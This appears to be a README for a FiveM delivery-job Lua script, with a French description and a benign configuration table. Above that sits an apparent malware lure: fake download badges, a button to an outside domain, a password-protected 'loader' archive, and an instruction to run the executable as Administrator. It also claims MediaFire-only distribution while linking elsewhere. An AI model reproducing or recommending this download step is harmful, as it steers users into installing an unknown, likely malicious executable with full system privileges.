<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Delivery Job – Script FiveM

## Présentation
Delivery Job est un système de missions de livraison dynamique pour FiveM.  
Le joueur récupère un colis, se rend à un point de livraison aléatoire, effectue plusieurs livraisons successives, puis reçoit une rémunération basée sur le nombre de colis livrés.

Le script inclut :
- Un PNJ fixe servant de point d’entrée du job  
- Un véhicule dédié pour récupérer les colis (garage non inclut. à vous de crée votre garage le vehicule : speedo)
- Un système de cooldown  
- Des livraisons aléatoires avec un nombre variable de colis  
- Une gestion propre des animations, props, blips et markers  
- Une intégration complète avec ox_target  

---

## Configuration

```lua
local Config <const> = {
    PackageProps = "prop_cardbordbox_02a",
    PricePerDelivery = 100,
    PackageVehicle = "speedo",

    peds = {
        pedModel = "s_m_y_devinsec_01",
        pedCoords = vec3(962.18, -2189.42, 29.50),
        pedHeading = 96.22
    },

    blip = {
        blipSprite = 67,
        blipColour = 13,
        blipScale = 0.6,
        blipDisplay = 4,
        blipLabel = "Delivery Job",
        blipCoords = vec3(962.18, -2189.42, 29.50)
    },

    deliveryRandomPos = {
        ["MirrorPark"] = {
            minDelivery = 2,
            maxDelivery = 10,
            pos = {
                vec3(931.15, -2183.83, 30.39),
                vec3(948.65, -2176.31, 30.55)
            }
        }
    }
}
